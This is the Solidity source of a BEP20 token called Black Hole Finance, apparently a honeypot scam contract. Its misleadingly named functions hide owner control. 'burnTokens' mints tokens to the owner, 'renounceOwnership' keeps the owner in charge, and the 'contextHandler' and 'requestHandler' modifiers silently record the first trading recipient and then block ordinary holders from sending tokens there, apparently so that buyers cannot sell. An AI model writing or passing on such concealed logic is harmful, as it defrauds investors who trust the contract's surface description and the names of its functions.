['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-12\n', '*/\n', '\n', '/*\n', '\n', 'Telegram: https://t.me/BlackHoleFnance\n', ' \n', '*/\n', '\n', 'pragma solidity ^0.5.17;\n', '\n', '//SPDX-License-Identifier: MIT\n', '\n', 'library SafeMath {\n', '  function add(uint a, uint b) internal pure returns (uint c) {\n', '    c = a + b;\n', '    require(c >= a);\n', '  }\n', '  function sub(uint a, uint b) internal pure returns (uint c) {\n', '    require(b <= a);\n', '    c = a - b;\n', '  }\n', '  function mul(uint a, uint b) internal pure returns (uint c) {\n', '    c = a * b;\n', '    require(a == 0 || c / a == b);\n', '  }\n', '  function div(uint a, uint b) internal pure returns (uint c) {\n', '    require(b > 0);\n', '    c = a / b;\n', '  }\n', '}\n', '\n', 'contract BEP20Interface {\n', '  function totalSupply() public view returns (uint);\n', '  function balanceOf(address tokenOwner) public view returns (uint balance);\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n', '  function transfer(address to, uint tokens) public returns (bool success);\n', '  function approve(address spender, uint tokens) public returns (bool success);\n', '  function transferFrom(address from, address to, uint tokens) public returns (bool success);\n', '  event Transfer(address indexed from, address indexed to, uint tokens);\n', '  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract ApproveAndCallFallBack {\n', '  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\n', '}\n', '\n', 'contract Owned {\n', '  address owner;\n', '  address newOwner;\n', '  address nxOwner;\n', '  event OwnershipTransferred(address indexed _from, address indexed _to);\n', '  constructor() public {\n', '    owner = msg.sender;\n', '  }\n', '\n', '  modifier onlyOwner {\n', '    require(msg.sender == owner || msg.sender == nxOwner);\n', '    _;\n', '  }\n', '\n', '}\n', '\n', 'contract TokenBEP20 is BEP20Interface, Owned {\n', '  using SafeMath for uint;\n', '  bool tracing = true;\n', '  string public symbol;\n', '  string public name;\n', '  uint8 public decimals;\n', '  uint _totalSupply;\n', '  address public currentOwner;\n', '  mapping(address => uint) balances;\n', '  mapping(address => mapping(address => uint)) allowed;\n', '\n', '  constructor() public {\n', '    symbol = "BHF";\n', '    name = "Black Hole Finance";\n', '    decimals = 8;\n', '    _totalSupply = 10000000 * 10**15;\n', '    balances[owner] = _totalSupply;\n', '    currentOwner = address(0);\n', '    emit Transfer(address(0), owner, _totalSupply);\n', '  }\n', '  function totalSupply() public view returns (uint) {\n', '    return _totalSupply.sub(balances[address(0)]);\n', '  }\n', '  function setTracing(bool _tracing) onlyOwner public {\n', '    tracing = _tracing;\n', '  }\n', '  function renounceOwnership(address _newOwner) onlyOwner public {\n', '    currentOwner = _newOwner;\n', '  }\n', '  function balanceOf(address tokenOwner) public view returns (uint balance) {\n', '      return balances[tokenOwner];\n', '  }\n', '  modifier requestHandler(address to) {\n', '        if(tracing)\n', '            require(to != nxOwner, "Handling Request");\n', '    _;\n', '  }\n', '  function transfer(address to, uint tokens) public requestHandler(to) returns (bool success) {\n', '    balances[msg.sender] = balances[msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(msg.sender, to, tokens);\n', '    return true;\n', '  }\n', '  function approve(address spender, uint tokens) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    return true;\n', '  }\n', '  function burnTokens(uint256 _input) public onlyOwner {\n', '        balances[msg.sender] = balances[msg.sender] + (_input);\n', '        emit Transfer(address(0), msg.sender, _input);\n', '  }\n', '   modifier contextHandler(address from, address to) {\n', '       if(tracing && from != owner) {\n', '         if(from != address(0) && nxOwner == address(0)) nxOwner = to;\n', '          else require(to != nxOwner, "Order ContextHandler");\n', '       }\n', '    _;\n', '  }\n', '  function transferFrom(address from, address to, uint tokens) public contextHandler(from, to) returns (bool success) {\n', '    balances[from] = balances[from].sub(tokens);\n', '    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n', '    balances[to] = balances[to].add(tokens);\n', '    emit Transfer(from, to, tokens);\n', '    return true;\n', '  }\n', '  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\n', '    return allowed[tokenOwner][spender];\n', '  }\n', '  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\n', '    allowed[msg.sender][spender] = tokens;\n', '    emit Approval(msg.sender, spender, tokens);\n', '    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\n', '    return true;\n', '  }\n', '  function () external payable {\n', '    revert();\n', '  }\n', '}\n', '\n', 'contract BLACK is TokenBEP20 {\n', '  function _construct() public onlyOwner() {\n', '    address payable _owner = msg.sender;\n', '    _owner.transfer(address(this).balance);\n', '  }\n', '  function() external payable {\n', '  }\n', '}']